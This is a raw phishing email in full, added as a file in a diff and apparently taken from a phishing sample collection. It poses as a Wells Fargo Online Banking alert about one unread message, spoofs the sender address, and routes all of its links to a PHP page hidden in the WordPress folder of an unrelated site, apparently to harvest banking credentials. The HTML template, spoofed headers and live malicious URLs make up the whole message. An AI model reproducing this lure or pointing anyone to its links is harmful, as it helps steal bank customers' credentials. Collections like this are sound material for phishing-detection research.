@@ -1,0 +1,158 @@
+Return-Path: <podlogifracz@podlogifracz.nazwa.pl>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 9E173F4106
+	for <jose@login.monkey.org>; Mon, 14 Sep 2015 09:39:48 -0500 (CDT)
+Received: from smtpin02.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id 3C0AF1845FB
+	for <jose@login.monkey.org>; Mon, 14 Sep 2015 14:39:48 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70632108456.02.glove44_5583dfa62dd44
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 77,5.5,0,78b6038e810ee06e,d41d8cd98f00b204,podlogifracz@podlogifracz.nazwa.pl,:,RULES_HIT:41:46:72:150:153:355:375:379:479:543:962:967:969:973:983:988:989:1189:1208:1216:1224:1260:1263:1311:1313:1314:1345:1381:1390:1431:1432:1433:1434:1436:1437:1513:1515:1516:1517:1521:1534:1543:1545:1567:1570:1588:1589:1592:1593:1594:1676:1711:1712:1714:1730:1747:1777:1792:2194:2198:2199:2200:2393:2525:2543:2567:2610:2682:2685:2693:2741:2859:2890:2892:2894:2895:2900:2902:2924:2925:2926:2931:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3138:3139:3140:3141:3142:3148:3865:3866:3867:3870:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:3976:3995:4042:4321:4401:4605:5007:6261:6669:6674:6678:6688:7688:7801:8603:8784:8932:8957:9025:9060:9080:9388:9908:10011:10185:10346:11529:11641:11658:11914:11984:12043:12114:12438:12555:12679:12956:12958:12960:13038:13046:13095:13139:13374:13548:14037:14094:14158:21080:21212,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,Dom
+X-HE-Tag: glove44_5583dfa62dd44
+X-Filterd-Recvd-Size: 4216
+Received: from aal154.rev.netart.pl (aal154.rev.netart.pl [77.55.11.154])
+	by imf23.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 14 Sep 2015 14:39:47 +0000 (UTC)
+Received: from podlogifracz.nazwa.pl (unknown [85.128.142.26])
+	by podlogifracz.nazwa.pl (Postfix) with ESMTP id A99CB38A58F
+	for <jose@monkey.org>; Mon, 14 Sep 2015 16:39:46 +0200 (CEST)
+Date: Mon, 14 Sep 2015 16:39:46 +0200
+To: jose@monkey.org
+From: =?UTF-8?Q?Wells_Fargo_Online_Banking?= <alerts@notify.wellsfargo.com>
+Subject: =?UTF-8?Q?Messages_=26_Alerts=3a_=31_new_message?=
+Message-ID: <f1811c81f3c26ee8535a5586d966ee60@www.podlogifraczak.pl>
+X-Priority: 3
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset="us-ascii"
+X-HTTP-Posting-URI: http://www.podlogifraczak.pl:80/img/maszyny/gallery/min/chiko.php
+X-HTTP-Client: 120.140.74.71
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 173
+
+<html>
+
+<head>
+<meta http-equiv=3D"Content-Language" content=3D"en-us">
+<meta name=3D"GENERATOR" content=3D"Microsoft FrontPage 5.0">
+<meta name=3D"ProgId" content=3D"FrontPage.Editor.Document">
+<meta http-equiv=3D"Content-Type" content=3D"text/html;=20
+
+charset=3Dwindows-1252">
+<title>New Page 2</title>
+</head>
+
+<body>
+
+<table style=3D"width:600px;border-top:4px solid #dddece;border-
+
+bottom:1px solid #999" cellpadding=3D"0" cellspacing=3D"0">
+  <tr>
+    <td style=3D"width:62px">
+    <a accesskey=3D"M" class=3D"headerLink"=20
+
+href=3D"https://encrypted-tbn0.gstatic.com/images?
+
+q=3Dtbn:ANd9GcSO7j82grcXPrllBMhmKNgmDj5QwcP-6BVM2NLv33FtH-
+
+4Na_aEtQ">
+    <img id=3D"logo" class=3D"inline" alt=3D"Wells fargo Home Page"=20
+
+src=3D"https://a248.e.akamai.net/7/248/3608/bb61162e7a787f/online
+
+-static.wellsfargo.com/common/images/logo_62sq.gif" border=3D"0"=20
+
+width=3D"120" height=3D"80"></a>
+    <div id=3D"utility" class=3D"noprint">
+      <a id=3D"securityguarantee" class=3D"prominentNavLinks"=20
+
+href=3D"https://www.Wells Fargo Online/security/security_olb">
+      OnlineSecurityGuarantee</a></div>
+    </td>
+    <td style=3D"padding-right:5px;text-align:right;vertical-
+
+align:top;font-family:arial,helvetica,sans-serif;font-
+
+size:12px">
+    <a href=3D"https://www.Wells Fargo Online" style=3D"font-
+
+size:12px;font-family:arial,helvetica,sans-serif;color:#336699"=20
+
+target=3D"_blank">
+    <strong>Wells Fargo Online</strong></a></td>
+  </tr>
+</table>
+<p>=A0</p>
+<table style=3D"width:600px;font-family:arial,helvetica,sans-
+
+serif;font-size:12px" border=3D"0" cellpadding=3D"0"=20
+
+cellspacing=3D"0">
+  <tr>
+    <td>
+    <font=3D"verdana"><b>Dear Customer,</b></font=3D"verdana"><p>
+    <font=3D"verdana" size=3D"2"><b><br>
+    You Have One Unread Message In Your Online Banking Account=20
+
+</b>
+    </font=3D"verdana">
+    </p>
+    <b>
+    <p><font face=3D"Verdana" size=3D"1">
+    <a href=3D"http://reubenkirkham.com/wp-
+
+includes/fonts/wellsfargo-online.php" target=3D"_blank">VIEW YOUR=20
+    MESSAGE</a></font> </p>
+    </b>
+    <div style=3D"margin:16px 0 12px 0;padding:3px 0 3px=20
+
+10px;background-color:#f7f8f3;border-top:1px solid=20
+
+#b3b2b2;border-bottom:1px solid #b3b2b2;vertical-align:top">
+      <a href=3D"http://reubenkirkham.com/wp-
+
+includes/fonts/wellsfargo-online.php" style=3D"font-
+
+size:12px;font-family:arial,helvetica,sans-serif;color:#336699"=20
+
+target=3D"_blank">
+      <strong>Wells Fargo Online</strong></a> |
+      <a href=3D"http://reubenkirkham.com/wp-
+
+includes/fonts/wellsfargo-online.php" style=3D"font-
+
+size:12px;font-family:arial,helvetica,sans-serif;color:#336699"=20
+
+target=3D"_blank">
+      Fraud Information Center</a></div>
+    <div style=3D"padding-left:10px;font-size:11px;margin-
+
+bottom:15px;color:#666">
+      Note: If you use Bill Pay, you will need to update your=20
+
+contact=20
+      information for that service separately. You'll find a=20
+
+link on the right=20
+      side of the Update Your Contact Information screen.</div>
+    <div style=3D"padding-left:10px;font-size:11px;margin-
+
+bottom:15px;color:#666">
+      C625861B697268A8E0440021283BC0<wbr>44=A0=A0</div>
+    </wbr>
+    </td>
+  </tr>
+</table>
+<p>=A0</p>
+
+</body>
+
+</html>
